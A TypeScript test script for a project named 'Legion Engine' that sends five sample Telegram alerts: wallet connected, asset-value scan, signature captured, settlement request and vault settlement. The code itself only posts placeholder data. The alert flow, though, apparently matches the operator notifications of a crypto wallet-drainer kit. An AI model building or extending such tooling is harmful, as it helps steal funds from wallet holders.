/**
 * Legion Engine — Telegram Notification Test Script
 * 
 * Uses your existing TELEMETRY_WEBHOOK_URL from .env
 * 
 * Run:
 *   cd apps/api
 *   npx tsx src/scripts/test-telegram.ts
 */

import { config } from 'dotenv'

// Load .env from multiple possible locations
config({ path: '../../.env' })
config({ path: '../../../.env' })
config({ path: '.env' })

function getISTTimestamp(): string {
  return new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day: '2-digit', month: 'short', year: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    hour12: true,
  }) + ' IST'
}

// ─── Resolve webhook URL and chat_id ────────────────────────────────────────

const WEBHOOK_URL = process.env['TELEMETRY_WEBHOOK_URL']?.trim()
const EXPLICIT_CHAT_ID = process.env['TELEGRAM_CHAT_ID']?.trim()

if (!WEBHOOK_URL) {
  console.error(`
❌  TELEMETRY_WEBHOOK_URL not set!

    Add to your .env file:
    TELEMETRY_WEBHOOK_URL=https://api.telegram.org/bot<TOKEN>/sendMessage
    TELEGRAM_CHAT_ID=<your_chat_id>   (optional if chat_id is in URL)
  `)
  process.exit(1)
}

// Extract token from URL for display
let TOKEN_PREVIEW = 'hidden'
try {
  const match = WEBHOOK_URL.match(/bot([^/]+)\//)
  if (match?.[1]) TOKEN_PREVIEW = match[1].slice(0, 12) + '...'
} catch { /* ignore */ }

// Resolve chat_id: explicit env var > URL query param
let CHAT_ID = EXPLICIT_CHAT_ID ?? null
if (!CHAT_ID) {
  try {
    const parsed = new URL(WEBHOOK_URL)
    CHAT_ID = parsed.searchParams.get('chat_id')
  } catch { /* ignore */ }
}

if (!CHAT_ID) {
  console.error(`
❌  TELEGRAM_CHAT_ID not found!

    Either add to .env:
    TELEGRAM_CHAT_ID=your_chat_id

    Or embed in TELEMETRY_WEBHOOK_URL:
    TELEMETRY_WEBHOOK_URL=https://api.telegram.org/bot<TOKEN>/sendMessage?chat_id=YOUR_ID
  `)
  process.exit(1)
}

// Clean URL (remove chat_id from query params)
let CLEAN_URL = WEBHOOK_URL
try {
  const parsed = new URL(WEBHOOK_URL)
  parsed.searchParams.delete('chat_id')
  CLEAN_URL = parsed.toString()
} catch { /* ignore */ }

// ─── Send function ───────────────────────────────────────────────────────────

async function send(text: string, label: string): Promise<void> {
  try {
    const res = await fetch(CLEAN_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' }),
      signal: AbortSignal.timeout(10_000),
    })
    const json = await res.json() as { ok: boolean; description?: string }
    if (json.ok) {
      console.log(`✅  [${label}] Sent successfully`)
    } else {
      console.error(`❌  [${label}] API Error: ${json.description}`)
      console.error(`    → Check your bot token in TELEMETRY_WEBHOOK_URL`)
    }
  } catch (err) {
    console.error(`❌  [${label}] Network Error: ${String(err)}`)
  }
}

// ─── Run Tests ───────────────────────────────────────────────────────────────

async function runTests(): Promise<void> {
  console.log(`
⚡  LEGION ENGINE — Telegram Notification Test
────────────────────────────────────────
Webhook   : ${CLEAN_URL.slice(0, 40)}...
Token     : ${TOKEN_PREVIEW}
Chat ID   : ${CHAT_ID}
Time (IST): ${getISTTimestamp()}
────────────────────────────────────────
Sending 5 test notifications...
`)

  await send(
    `🔌 <b>NEW WALLET CONNECTED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
👛 <b>Wallet:</b> MetaMask
🕐 ${getISTTimestamp()}`,
    'WALLET_CONNECTED'
  )

  await send(
    `🔍 <b>ELIGIBILITY SCAN COMPLETE</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
💰 <b>Total Value:</b> $12,500.00
📦 <b>Assets Found:</b> 7
🕐 ${getISTTimestamp()}`,
    'SCAN_COMPLETE'
  )

  await send(
    `✍️ <b>SIGNATURE ANCHORED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
🔏 <b>Sig:</b> <code>0xaabbcc...ee1234</code>
🕐 ${getISTTimestamp()}`,
    'SIGNATURE_RECEIVED'
  )

  await send(
    `⚡ <b>SETTLEMENT REQUEST INITIATED</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
⛓️ <b>Chain:</b> EVM
👛 <b>Wallet:</b> MetaMask
💵 <b>Declared Value:</b> $12,500.00
🕐 ${getISTTimestamp()}`,
    'SETTLEMENT_REQUEST'
  )

  await send(
    `💰 <b>VAULT SETTLEMENT CONFIRMED ✅</b> [TEST]
━━━━━━━━━━━━━━━━
📍 <b>Address:</b> <code>0xAbCd...1234</code>
💵 <b>Amount:</b> $12,500.00
🔗 <b>TX:</b> <code>0xdeadbeef...cafe</code>
✅ <b>Status:</b> CONFIRMED
🕐 ${getISTTimestamp()}`,
    'VAULT_SETTLEMENT'
  )

  console.log(`
────────────────────────────────────────
✅  All 5 tests fired!
📱 Check your Telegram now.
`)
}

runTests().catch(console.error)
